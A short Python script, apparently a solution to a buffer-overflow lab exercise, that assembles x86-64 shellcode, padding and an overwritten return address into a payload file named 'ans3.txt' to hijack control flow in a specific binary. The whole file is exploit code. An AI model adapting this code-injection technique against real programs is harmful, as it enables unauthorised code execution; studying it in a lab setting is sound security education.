import struct

shellcode = (
    b"\x50"                                 # push rax (align stack)
    b"\x48\xc7\xc7\x72\x00\x00\x00"         # mov rdi, 114
    b"\x48\xc7\xc0\x16\x12\x40\x00"         # mov rax, 0x401216
    b"\xff\xd0"                             # call rax
)

padding = b'a' * (40 - len(shellcode))

ret_addr = b"\x34\x13\x40\x00\x00\x00\x00\x00"

payload = shellcode + padding + ret_addr

with open("ans3.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans3.txt")
